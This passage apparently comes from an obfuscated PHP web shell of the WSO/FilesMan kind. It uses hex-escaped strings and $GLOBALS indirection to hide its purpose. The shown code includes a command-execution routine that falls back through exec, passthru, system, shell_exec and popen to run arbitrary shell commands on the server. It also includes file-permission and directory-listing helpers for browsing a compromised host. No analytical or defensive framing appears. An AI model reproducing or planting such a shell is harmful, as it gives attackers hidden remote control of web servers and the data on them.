ugh"]="o\x75\x74";$fiwstcvip="\x69\x6e";$eyutjqoxp="\x6f\x75t";@exec(${$fiwstcvip},${${"\x47LOB\x41\x4c\x53"}["g\x6a\x6e\x6ev\x73\x68\x64u\x67h"]});${${"\x47\x4c\x4fB\x41\x4c\x53"}["\x69\x71\x66ht\x70s"]}=@join("\n",${$eyutjqoxp});}elseif(function_exists("passt\x68ru")){ob_start();@passthru(${${"\x47\x4c\x4f\x42\x41LS"}["\x6a\x6am\x68i\x70\x6e\x6c\x63\x76"]});${${"\x47\x4c\x4fB\x41\x4cS"}["i\x71\x66\x68\x74p\x73"]}=ob_get_clean();}elseif(function_exists("sy\x73tem")){ob_start();@system(${${"GLO\x42A\x4c\x53"}["\x6aj\x6d\x68\x69pnl\x63\x76"]});${${"\x47\x4cO\x42A\x4c\x53"}["\x69q\x66\x68\x74p\x73"]}=ob_get_clean();}elseif(function_exists("s\x68\x65l\x6c\x5f\x65\x78ec")){${${"\x47\x4c\x4f\x42\x41LS"}["\x69\x71\x66ht\x70s"]}=shell_exec(${${"\x47LO\x42\x41\x4cS"}["\x6a\x6a\x6dh\x69pnl\x63\x76"]});}elseif(is_resource(${$vqwxpteyje}=@popen(${${"\x47\x4c\x4f\x42\x41LS"}["\x6a\x6a\x6d\x68\x69\x70n\x6c\x63v"]},"\x72"))){${"G\x4c\x4f\x42\x41LS"}["b\x6e\x6c\x6b\x6efo\x78"]="\x66";$psbrszkpi="\x6f\x75\x74";${$psbrszkpi}="";$qmeqpmi="\x66";while(!@feof(${$qmeqpmi}))${${"\x47L\x4fB\x41\x4c\x53"}["\x69\x71fht\x70\x73"]}.=fread(${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x62\x6elk\x6e\x66o\x78"]},1024);pclose(${${"\x47\x4c\x4f\x42A\x4cS"}["b\x70xvbi\x79\x64jq"]});}return${${"GL\x4f\x42\x41L\x53"}["i\x71fh\x74p\x73"]};}function viewSize($s){$fxlqmymds="\x73";if(${${"\x47\x4c\x4fBA\x4c\x53"}["r\x79f\x67\x70b\x79afkq"]}>=1073741824)return sprintf("\x25\x31.2\x66",${${"\x47\x4c\x4fB\x41\x4c\x53"}["\x72y\x66\x67\x70\x62\x79af\x6b\x71"]}/1073741824)."\x20GB";elseif(${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x72\x79f\x67\x70b\x79\x61\x66kq"]}>=1048576)return sprintf("\x251\x2e2f",${${"\x47\x4cO\x42\x41\x4c\x53"}["\x72\x79\x66\x67\x70\x62\x79\x61\x66\x6b\x71"]}/1048576)."\x20\x4dB";elseif(${${"\x47\x4c\x4f\x42\x41\x4cS"}["\x72y\x66gpbya\x66kq"]}>=1024)return sprintf("\x25\x31\x2e\x32f",${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x72y\x66\x67\x70\x62y\x61\x66\x6b\x71"]}/1024)." K\x42";else return${$fxlqmymds}."\x20B";}function perms($p){${"\x47\x4c\x4fB\x41\x4c\x53"}["\x67\x6a\x66\x77\x77\x69\x67\x69"]="i";$ndfrvrtbyi="i";${"\x47\x4c\x4fB\x41\x4c\x53"}["\x75\x79\x72\x77\x66u\x64\x6f\x6a\x61"]="p";${"\x47\x4cO\x42\x41L\x53"}["\x74kv\x63\x75u\x62gfl\x62"]="\x70";${"G\x4cO\x42A\x4c\x53"}["f\x70\x66\x68x\x66tb\x68\x69"]="i";$udcuyrl="p";${"\x47L\x4f\x42\x41LS"}["x\x79\x79f\x77pm\x69\x6c"]="p";${"G\x4c\x4fB\x41\x4c\x53"}["qk\x69\x79e\x62\x65\x6bg"]="\x70";$mbtyqoykaioe="\x70";${"\x47L\x4f\x42\x41L\x53"}["\x63kd\x77q\x6b\x6d\x76\x62"]="\x70";${"GL\x4fBA\x4c\x53"}["q\x72\x66\x76\x70\x6f\x68\x75\x69\x74th"]="\x69";$ebmfymc="p";$ctnqyzuim="i";$lknvqtlunwnl="\x70";$uzbcplg="\x70";${"G\x4c\x4fB\x41LS"}["\x6d\x78\x61qww\x64"]="\x70";if((${${"\x47\x4cO\x42\x41\x4c\x53"}["x\x68\x65\x61gf\x64\x6do"]}&0xC000)==0xC000)${${"\x47\x4cOB\x41\x4cS"}["f\x70f\x68\x78\x66t\x62\x68i"]}="s";elseif((${${"G\x4c\x4fB\x41L\x53"}["\x78\x68e\x61\x67\x66\x64m\x6f"]}&0xA000)==0xA000)${${"\x47\x4c\x4f\x42A\x4cS"}["\x67j\x66\x77w\x69\x67\x69"]}="\x6c";elseif((${$mbtyqoykaioe}&0x8000)==0x8000)${${"\x47\x4cOB\x41\x4cS"}["q\x72fvpohui\x74\x74\x68"]}="-";elseif((${${"\x47\x4cO\x42\x41L\x53"}["\x78\x79\x79\x66\x77\x70\x6dil"]}&0x6000)==0x6000)${${"\x47\x4cO\x42\x41LS"}["\x70k\x6b\x6dg\x6d\x6d"]}="\x62";elseif((${${"\x47LO\x42A\x4c\x53"}["x\x68ea\x67f\x64\x6do"]}&0x4000)==0x4000)${${"GL\x4f\x42ALS"}["p\x6b\x6b\x6dg\x6dm"]}="\x64";elseif((${${"GL\x4fBA\x4c\x53"}["\x78h\x65\x61\x67\x66d\x6d\x6f"]}&0x2000)==0x2000)${${"\x47\x4cO\x42\x41L\x53"}["pkkm\x67\x6d\x6d"]}="\x63";elseif((${${"\x47\x4cO\x42\x41L\x53"}["\x63\x6bdw\x71k\x6dv\x62"]}&0x1000)==0x1000)${$ctnqyzuim}="p";else${${"\x47\x4cOB\x41\x4c\x53"}["\x70\x6b\x6b\x6d\x67\x6dm"]}="u";${${"\x47\x4cOB\x41\x4c\x53"}["\x70kkm\x67\x6d\x6d"]}.=((${$lknvqtlunwnl}&0x0100)?"r":"-");${${"GL\x4f\x42\x41LS"}["\x70kkmg\x6dm"]}.=((${$uzbcplg}&0x0080)?"\x77":"-");${${"\x47L\x4f\x42\x41\x4cS"}["\x70kk\x6d\x67\x6dm"]}.=((${${"G\x4c\x4fB\x41\x4cS"}["\x78\x68eag\x66\x64m\x6f"]}&0x0040)?((${${"GL\x4f\x42AL\x53"}["x\x68\x65\x61\x67f\x64m\x6f"]}&0x0800)?"s":"\x78"):((${${"GL\x4f\x42\x41L\x53"}["\x78\x68\x65a\x67\x66\x64m\x6f"]}&0x0800)?"S":"-"));$ydymyqite="\x69";${${"G\x4c\x4f\x42\x41L\x53"}["p\x6bkm\x67\x6d\x6d"]}.=((${${"\x47\x4c\x4f\x42\x41L\x53"}["\x71k\x69\x79e\x62\x65\x6bg"]}&0x0020)?"r":"-");${$ydymyqite}.=((${${"GL\x4f\x42ALS"}["u\x79\x72\x77\x66ud\x6fja"]}&0x0010)?"\x77":"-");$wcoeafy="p";${${"\x47\x4c\x4f\x42\x41\x4cS"}["\x70\x6bkm\x67mm"]}.=((${${"G\x4c\x4fB\x41LS"}["xh\x65ag\x66d\x6d\x6f"]}&0x0008)?((${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["mx\x61\x71\x77\x77\x64"]}&0x0400)?"s":"x"):((${${"\x47\x4c\x4f\x42\x41\x4c\x53"}["x\x68e\x61g\x66\x64m\x6f"]}&0x0400)?"S":"-"));${$ndfrvrtbyi}.=((${$wcoeafy}&0x0004)?"\x72":"-");${${"\x47L\x4f\x42\x41\x4cS"}["p\x6b\x6b\x6d\x67m\x6d"]}.=((${${"\x47\x4c\x4fBA\x4cS"}["x\x68\x65\x61g\x66\x64\x6do"]}&0x0002)?"w":"-");${${"\x47\x4c\x4fB\x41\x4c\x53"}["\x70\x6b\x6bm\x67\x6d\x6d"]}.=((${$udcuyrl}&0x0001)?((${${"G\x4c\x4fBA\x4c\x53"}["\x74\x6bv\x63\x75\x75b\x67f\x6c\x62"]}&0x0200)?"\x74":"\x78"):((${$ebmfymc}&0x0200)?"T":"-"));return${${"GL\x4fBAL\x53"}["\x70\x6bk\x6d\x67\x6d\x6d"]};}function viewPermsColor($f){$fqxmowx="\x66";$fvhgiwrglo="f";if(!@is_readable(${${"\x47\x4cO\x42\x41LS"}["\x62\x70x\x76\x62\x69y\x64\x6a\x71"]}))return"<\x66\x6fnt co\x6c\x6f\x72\x3d\x23FF0\x30\x30\x30><b\x3e".perms(@fileperms(${${"\x47L\x4f\x42\x41LS"}["bpxv\x62\x69\x79\x64\x6aq"]}))."</\x62\x3e</\x66ont>";elseif(!@is_writable(${${"G\x4c\x4f\x42ALS"}["\x62p\x78v\x62i\x79\x64j\x71"]}))return"\x3c\x66\x6fn\x74 c\x6fl\x6fr\x3dw\x68it\x65\x3e<\x62>".perms(@fileperms(${$fqxmowx}))."</b\x3e\x3c/\x66\x6fnt\x3e";else return"\x3cf\x6f\x6et c\x6flor\x3d\x230\x30A\x38A8\x3e<\x62>".perms(@fileperms(${$fvhgiwrglo}))."\x3c/b\x3e\x3c/fo\x6e\x74\x3e";}if(!function_exists("\x73c\x61\x6e\x64\x69r")){function scandir($dir){$emzsove="\x64\x68";${"\x47\x4cO\x42\x41\x4cS"}["\x6e\x68\x6b\x68j\x69\x68byk"]="\x64h";${$emzsove}=opendir(${${"\x47\x4c\x4